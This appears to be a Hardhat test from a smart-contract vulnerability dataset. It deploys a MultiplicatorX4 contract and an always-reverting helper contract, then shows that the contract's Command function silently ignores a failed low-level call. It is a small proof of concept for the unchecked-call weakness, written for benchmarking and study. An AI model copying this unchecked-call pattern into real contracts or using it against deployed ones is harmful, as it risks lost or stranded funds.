const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol", function () {

  let onwer;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const MultiplicatorX4 = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol:MultiplicatorX4");
    const contract = await MultiplicatorX4.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await expect(contract.connect(owner).Command(revertContract.target, "0x", {value: amount})).to.not.be.reverted;

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

  });
});
